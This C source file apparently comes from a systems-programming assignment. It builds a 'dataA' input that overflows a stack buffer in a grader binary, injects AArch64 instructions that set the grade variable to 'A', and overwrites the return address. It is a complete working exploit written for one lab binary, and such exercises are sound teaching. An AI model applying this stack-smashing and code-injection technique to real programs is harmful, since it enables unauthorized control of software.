/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* author: replaced_author                                             */
/*--------------------------------------------------------------------*/

/*
   this code constructs a "dataA" file that is carefully engineered to
   trick the grader program into displaying 'A' as the final grade. we
   accomplish this by overflowing a buffer to inject instructions that
   overwrite the 'grade' variable with 'A' and then jump back into the
   normal printing routine.

   steps at a glance:
   - write a chosen username and terminate it with a null byte.
   - add enough padding nulls to force the return address overwrite region.
   - create instructions that load 'A', point to the grade variable, store
     'A' there, and then branch back to the printing logic in main.
   - overwrite the function return address so execution transfers to our
     injected instructions instead of returning normally.
*/

/*
   runtime details:
   - no command-line arguments are read or processed.
   - does not read standard input or any other input stream.
   - writes only to a file named "dataA".
   - returns 0 if successful, 1 on file-related failure.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants derived through analysis of the grader binary */
enum {
    NAME_SIZE         = 9,        /* length of the username "AnishKKat" without terminating null */
    NUM_PADDING       = 22,       /* number of null bytes to push beyond stack boundaries */
    ASCII_A           = 0x41,     /* ASCII code for 'A' */
    ADDR_GRADE_VAR    = 0x420044, /* address of the 'grade' variable */
    ADDR_PRINT_CODE   = 0x40089c, /* address in main code to print the grade */
    ADDR_RET_INJECTED = 0x420078, /* new return address pointing to our instructions */
    ADDR_REF_ADR      = 0x42007c  /* reference point for adr calculation */
};

int main(void) {
    /* c89 requires all declarations at the start of the block */
    const char *pszUsername = "AnishKKat";
    FILE *pFileOut;
    unsigned int uiInstrMov;
    unsigned int uiInstrAdr;
    unsigned int uiInstrStrb;
    unsigned int uiInstrBranch;
    unsigned long ulNewRetAddr;
    int iCount;
    char cNullByte;
    unsigned int uiInstructionBlock[4];

    /* open the output file early and check for errors before writing */
    pFileOut = fopen("dataA", "wb"); /* explicitly use "wb" for binary mode */
    if (pFileOut == NULL) {
        /* print an error if unable to open file as per user request */
        fprintf(stderr, "error: cannot open dataA for writing.\n");
        return 1;
    }

    /* assign null byte once for clarity and reuse */
    cNullByte = '\0';

    /* first write the username followed by a null terminator */
    fwrite(pszUsername, 1, NAME_SIZE, pFileOut);
    fputc(cNullByte, pFileOut);

    /* add padding null bytes to overflow stack and position code injection */
    iCount = 0;
    while (iCount < NUM_PADDING) {
        fputc(cNullByte, pFileOut);
        iCount++;
    }

    /*
       generate instructions using the miniassembler:
       1) mov w0, 'A'     (load 'A' character into w0)
       2) adr x1, grade   (load the address of 'grade' into x1)
       3) strb w0, [x1]   (store 'A' into the grade variable)
       4) b ADDR_PRINT_CODE (branch back to the printing code)
    */

    uiInstrMov   = MiniAssembler_mov(0, ASCII_A);
    uiInstrAdr   = MiniAssembler_adr(1, ADDR_GRADE_VAR, ADDR_REF_ADR);
    uiInstrStrb  = MiniAssembler_strb(0, 1);
    uiInstrBranch= MiniAssembler_b(ADDR_PRINT_CODE, ADDR_REF_ADR + 8);

    /* store instructions in an array before writing them, a slight restructuring */
    uiInstructionBlock[0] = uiInstrMov;
    uiInstructionBlock[1] = uiInstrAdr;
    uiInstructionBlock[2] = uiInstrStrb;
    uiInstructionBlock[3] = uiInstrBranch;

    /* write all the instructions at once */
    fwrite(uiInstructionBlock, sizeof(unsigned int), 4, pFileOut);

    /* finally, overwrite the stored return address with ADDR_RET_INJECTED */
    ulNewRetAddr = ADDR_RET_INJECTED;
    fwrite(&ulNewRetAddr, sizeof(unsigned long), 1, pFileOut);

    /* close file and end */
    fclose(pFileOut);
    return 0;
}